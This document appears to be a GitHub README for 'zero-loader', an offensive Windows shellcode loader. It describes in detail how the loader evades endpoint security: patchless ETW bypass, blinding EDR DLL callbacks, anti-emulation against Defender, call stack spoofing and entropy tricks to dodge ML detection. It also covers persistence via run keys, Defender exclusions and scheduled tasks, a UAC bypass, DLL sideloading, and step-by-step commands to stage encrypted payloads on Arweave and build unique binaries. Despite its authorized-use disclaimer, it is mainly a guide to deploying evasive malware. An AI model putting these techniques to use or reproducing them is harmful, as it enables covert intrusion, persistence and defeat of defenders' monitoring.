<div align="center">

# zero-loader

**Polymorphic x64 shellcode loader**

Zero CRT. Zero static signatures. Zero trace in the call stack.

<br/>

![Arch](https://img.shields.io/badge/arch-x64-0d1117?style=for-the-badge&logo=windows&logoColor=white)
![Lang](https://img.shields.io/badge/C_|_MASM-0d1117?style=for-the-badge&logo=c&logoColor=white)
![CRT](https://img.shields.io/badge/CRT--free-0d1117?style=for-the-badge)
![License](https://img.shields.io/badge/MIT-0d1117?style=for-the-badge)

*Every build produces a unique binary — nothing matches across compilations.*

</div>

<br/>

> [!WARNING]
> This project is intended for authorized security testing, research, and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse.

<br/>

## Overview

Most loaders get flagged because they ship the same binary. **zero-loader** regenerates all cryptographic material on every build — keys, nonces, string encoding, PE metadata. No two compilations share a hash.

<br/>

## Features

> **Evasion**

| | |
|:--|:--|
| **Indirect Syscalls** | SSN sourced from a clean `\KnownDlls\ntdll.dll` section (defeats userland hooks on ntdll). 64 `syscall;ret` gadgets pooled, randomly selected per call via RDTSC. Hooked-stub fallback for neighbour-SSN recovery |
| **Patchless ETW** | VEH + hardware breakpoint (DR0) on `EtwEventWrite` via `NtContinue` — zero bytes modified, passes integrity checks |
| **Anti-emulation prologue** | RDTSC determinism check + CPUID `0x40000000` hypervisor brand check + API hammering to exhaust mpengine's ~200ms wall-clock budget. Bails before any allocation/decryption if running inside Defender's emulator |
| **Poison Fiber Kick-off** | Primary execution path is `ConvertThreadToFiber` + `SwitchToFiber` on the main thread — no new OS thread, so `PsSetCreateThreadNotifyRoutine` never fires. Thread-pool fallback if fiber APIs unavailable |
| **Multi-module Call Stack Spoofing** | `FF D3` (call rbx) gadgets pooled from ntdll / kernel32 / kernelbase (up to 64); per-run RDTSC pick defeats "single return-address frequency" heuristics. All frames resolve to legitimate modules |
| **Wait:UserRequest keep-alive** | Alertable `NtWaitForSingleObject(NtCurrentProcess)` instead of `NtDelayExecution`, so the thread's `WaitReason` reads `UserRequest` — beats Hunt-Sleeping-Beacons / BeaconHunter fingerprints |
| **Anti-Analysis** | PEB debugger flag, NtGlobalFlag, CPU count, RDTSC timing delta |
| **IAT Camouflage** | Dead-code benign imports the optimizer cannot eliminate |
| **Blind DLL Notifications** | Walks and unlinks all EDR `LdrRegisterDllNotification` callbacks — subsequent `LoadLibrary` invisible |
| **DLL preload shuffle** | After blinding, amsi/wininet are preloaded in a RDTSC-seeded Fisher-Yates order so the remaining kernel-ETW image-load sequence is unpredictable |
| **Exit Hook** | Patches `RtlExitUserProcess` with PAUSE loop — prevents host exit from killing C2 (DLL sideload) |
| **Post-Exec Cleanup** | Removes VEH, clears DR0/DR1/DR7 via `NtContinue`, wipes keys/URLs/nonces before shellcode execution |

> **Crypto & Staging**

| | |
|:--|:--|
| **Chaskey-12 CTR** | ARX block cipher — pure ALU, no S-boxes, no lookup tables, no RC4 signatures |
| **LZNT1 Compression** | Compressed before encryption, decompressed at runtime via ntdll |
| **Polymorphic Strings** | 4-byte rotating XOR across 25+ strings, keys regenerated every build |
| **PE Mutation** | TimeDateStamp, Rich header, section padding, checksum — randomized post-build |
| **Entropy Balancing** | Section padding filled with natural-language strings (API names, HTTP headers, lorem ipsum) so overall section entropy stays in the 4.5-6.5 bit/byte range, dodging Defender ML / ESET / Sophos high-entropy heuristics |
| **HTTPS Staging** | Dynamic WinINet + `InternetCrackUrlA` + self-signed cert bypass |
| **W^X Memory** | `PAGE_EXECUTE_READ` default. `RWX_SHELLCODE` flag for Go-based implants |

> **DLL Sideloading**

| | |
|:--|:--|
| **Export Forwarding** | Auto-generated linker pragmas — PE loader handles all legitimate API calls natively |
| **Version Info Cloning** | Extracts and reproduces `VS_VERSIONINFO` from target DLL |
| **Process Persistence** | `RtlExitUserProcess` patch + `LdrAddRefDll` pin — DLL survives host exit |
| **Optional UAC** | `uac` build flag enables self-relaunch elevation via AppInfo RPC bypass — no UAC dialog, no manifest |
| **Loader Lock Safe** | DllMain uses ntdll-only APIs; loader pipeline deferred to thread pool |

<br/>

## Quick Start

```bash
# 1  Create an Arweave wallet (one-time)
python arweave/create.py
#    Fund the wallet with AR tokens before uploading

# 2  Encrypt & compress shellcode — embed your wallet address
python Encrypt.py payload.bin --wallet <43-char-arweave-address>
#    → data.enc  (key embedded in header — no separate key file)
#    → Payload.h (wallet address obfuscated, fresh keys every run)

# 3  Upload payload to Arweave
python arweave/upload.py data.enc
#    → TX confirmed in ~10-30 min; loader retries automatically

# 4  Build
build.bat                                  # EXE
build.bat uac                              # EXE with UAC manifest
```

> Re-run steps 2-4 for a completely new binary with fresh crypto material.

> To verify the full download pipeline before deploying, run:
> `python arweave/download.py <wallet-address>`

<details>
<summary><b>Web Console (optional)</b></summary>

<br/>

A browser-based wrapper for the full pipeline. Runs on `127.0.0.1` only — no auth, not meant to be exposed to a network.

```bash
cd web
run.bat            # first run creates .venv and installs Flask
                   # then starts http://127.0.0.1:7890
```

Covers the entire workflow: encrypt shellcode → upload to Arweave → build EXE/DLL. Streams `build.bat` output live, shows per-section entropy from `Mutate.py`, and exposes every compile-time flag (`DEBUG`, `RWX_SHELLCODE`, `uac`) as a checkbox. The Arweave tab manages wallets, triggers uploads, and scans confirmed transactions.

</details>

<details>
<summary><b>DLL Sideloading</b></summary>

<br/>

```bash
# 1  Generate export forwarding
python SideloadGen.py C:\Windows\System32\<target>.dll

# 2  Encrypt shellcode
python Encrypt.py payload.bin --wallet <ARWEAVE_ADDRESS>

# 3  Upload to Arweave
python arweave/upload.py data.enc

# 4  Build
build.bat sideload <target>.dll            # no UAC
build.bat sideload <target>.dll uac        # self-relaunch UAC

# 5  Deploy
#    Rename real <target>.dll → <target>_orig.dll
#    Place proxy <target>.dll + <target>_orig.dll alongside host EXE
#    Run host EXE — loader fetches payload from Arweave at runtime
```

</details>

<details>
<summary><b>Build Flags</b></summary>

<br/>

Edit `Common.h` or pass via `build.bat`:

| Flag | Default | Purpose |
|:-----|:--------|:--------|
| `DEBUG` | Off | Logging to `debug.log`, skips anti-analysis |
| `RWX_SHELLCODE` | Off | `PAGE_EXECUTE_READWRITE` for Go/Sliver |
| `BUILD_DLL` | Off | DLL sideload build (set by `build.bat sideload`) |
| `REQUIRE_ELEVATION` | Off | Self-relaunch UAC for DLL sideload (`build.bat sideload ... uac`) |

</details>

<details>
<summary><b>Requirements</b></summary>

<br/>

- Windows 10/11 x64
- Visual Studio 2022+ (MSVC + ml64)
- Python 3.x

</details>

<br/>

## Architecture

### Execution Chain

```
Main()
 │
 ├─ IatCamouflage              pad IAT with benign imports
 ├─ AntiAnalysis               PEB · NtGlobalFlag · RDTSC
 ├─ InitializeNtSyscalls       single-pass export scan
 │                              └ SwitchToCleanNtdll (\KnownDlls\ntdll.dll)
 │                              └ 64-entry syscall;ret gadget pool
 ├─ InitializeWinApis          FindLoadedModuleW → kernel32 → JOAAT resolve
 ├─ BlindDllNotifications      unlink LdrRegisterDllNotification entries
 ├─ ShufflePreloadLibraries    Fisher-Yates (RDTSC) amsi/wininet/ktmw32
 ├─ AntiAnalysis               PEB.BeingDebugged · NtGlobalFlag · NumberOfProcessors · RDTSC
 ├─ AntiEmulation              RDTSC variance · CPUID hv brand · mpengine budget burn
 ├─ PatchlessEtw               DR0 = EtwEventWrite
 │
 ├─ [UAC EXE] UacBypass        medium IL → AppInfo RPC → spawn elevated → terminate
 │                              elevated  → InstallAndTerminate (WD excl + copy + task) → terminate
 │                              reboot    → IsFirstRunProcess=FALSE → fall through
 ├─ [non-UAC, first run] InstallAndTerminate / SideloadInstallAndContinue
 │                              InstallPersistence (HKCU run key) → copy → launch → terminate
 ├─ [non-UAC, reboot]    self-guard fires → return → fall through
 │
 ├─ FetchArweaveMeta           GraphQL POST → TX ID list → GET combined data
 │                              └ ArwParseHeader (4-pipe scan → key/nonce/size/flag)
 ├─ ChaskeyCtrDecrypt          in-place decryption
 ├─ DecompressPayload          LZNT1 via RtlDecompressBuffer
 │
 ├─ NtAllocateVirtualMemory     private RW → copy → RX/RWX
 │
 ├─ CleanupEvasion             wipe VEH · DR regs · keys · URLs
 ├─ CollectCallGadgets         pool FF D3 from ntdll/k32/kbase/dbgcore/dbghelp/dsdmo
 ├─ GetRandomCallGadget        RDTSC pick
 ├─ SetSpoofTarget             configure ASM trampoline
 │
 ├─ ConvertThreadToFiber       primary: Poison Fiber on main thread
 ├─ CreateFiber(SpoofCallback)
 └─ SwitchToFiber              never returns — shellcode runs on fiber
       ↳ fallback if fiber APIs unavailable:
         TpAllocWork / TpPostWork + alertable NtWaitForSingleObject
```

### DLL Sideload Flow

```
Host EXE loads proxy DLL → DllMain
 │
 ├─ PEB walk → find ntdll
 ├─ InstallExitHook            patch RtlExitUserProcess (PAUSE loop)
 ├─ TpAllocWork(SideloadWorker) → TpPostWork → return TRUE
 │   [Host app continues, ExitProcess blocked]
 │
 └─ SideloadWorker (thread pool)
     ├─ [uac, medium IL] IsElevated? → no: AppInfo RPC bypass → spawn elevated self → terminate
     ├─ [uac, high IL]   IsElevated? → yes: SideloadInstallAndContinue
     │                                  WD excl + Register-ScheduledTask + copy files
     │                                  RunTaskViaCom → launch task → terminate
     ├─ [non-uac, first run] SideloadInstallAndContinue
     │                        InstallPersistence (HKCU run key) + copy files
     │                        CreateProcessW("msoia.exe /pf") → terminate
     ├─ [reboot] self-guard (/pf) fires → skip install
     ├─ LdrAddRefDll           pin DLL in memory
     └─ Main()                 full loader pipeline (download → decrypt → shellcode)
```

### Call Stack

Poison Fiber path:

```
 RIP  shellcode           ← NtAllocateVirtualMemory (private RX)
  ↓   call rbx gadget     ← ntdll / kernel32 / kernelbase (randomized)
  ↓   fiber entry frame   ← fiber-allocated stack
```

### Encryption Pipeline

```
  Build time                                   Runtime
  ──────────                                   ───────

  shellcode.bin                          GraphQL POST arweave.net/graphql
       │                                 owners=[wallet], App-Name=zero-loader
  LZNT1 compress                                │
       │                                   TX ID list (newest first)
  Chaskey-CTR encrypt                           │
       │                                   GET arweave.net/<txid>
  combine header + binary                       │
  hex_key|hex_nonce|size|flag|<enc>        parse header (4 pipes)
       │                                        │
  arweave/upload.py ──→ Arweave TX    Chaskey-CTR decrypt
       │                                        │
  Payload.h                               LZNT1 decompress
  (wallet address obfuscated,                   │
   fresh XOR keys + placement key          shellcode ready
   every build)
```

<br/>

## Project Layout

```
main.c              orchestrates the execution chain
Syscalls.h/.c       indirect syscall engine · SSN + gadget pool
AsmStub.asm         x64 MASM · RunSyscall · SpoofCallback
WinApi.c            PEB walking · JOAAT hashing · CRT stubs
Evasion.c           patchless AMSI/ETW · anti-analysis · cleanup
Arweave.c           GraphQL beacon resolver · combined-format header parser
Gadgets.c           call-gadget pool · FF D3 harvest · RDTSC picker
Crypt.c             Chaskey-12 CTR · LZNT1 · key recovery
Staging.c           HTTPS staging · cert bypass
Common.h            defines · hashes · typedefs · macros
Structs.h           undocumented NT structures
Payload.h           auto-generated — wallet address + obfuscated strings (never edit)
Sideload.c          DLL entry point · exit hook · elevation
SideloadGen.py      export forwarding generator · version info cloning
Sideload.h          auto-generated export forwards (never edit)
Sideload.rc         auto-generated version info (never edit)
Encrypt.py          encrypt + compress + generate Payload.h
Mutate.py           post-build PE metadata randomizer
build.bat           ml64 → cl → Mutate.py
arweave/
  create.py         generate a new Arweave wallet keypair
  upload.py         upload combined data.enc to Arweave
  download.py       simulate the full C loader pipeline end-to-end
  wallet.json       funded Arweave keypair (never commit)
web/
  server.py         local Flask console (127.0.0.1:7890)
  run.bat           create .venv + start server
```
